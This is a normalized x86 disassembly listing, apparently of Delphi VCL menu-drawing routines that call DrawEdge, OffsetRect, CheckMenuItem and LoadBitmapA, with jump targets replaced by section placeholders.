cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44db6c
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44eaa8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44f600
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44ff08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41cf14
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c728
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043ec
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41cf14
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b894
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d780
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cf0c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41cf14
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cf14
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cf0c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_423828
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cee8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44fa4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4227d4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c728
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b894
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cf14
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44eaa8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c9f4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d780
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d470
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44bdac
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d780
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d20c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c728
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403290
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44eaa8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff0f
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44db6c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41d5bc
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_44eaa8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45005c
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_450a40
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45008c
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_4500d8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4502ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_40348c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45008c
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_450a40
mov esi eax
mov eax edi
call sub_45005c
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4043ec
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402cac
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404078
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44db6c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4042ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4502c1
lea eax [ ebp - 0x24 ]
call sub_403fe0
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44eaa8
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_4502ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4043ec
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404034
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_450314
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_450484
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_450494
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45035c
sub_45035c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44ea18
push eax
call CheckMenuItem
mov eax esi
call sub_450314
sub_4503b0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_450484
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
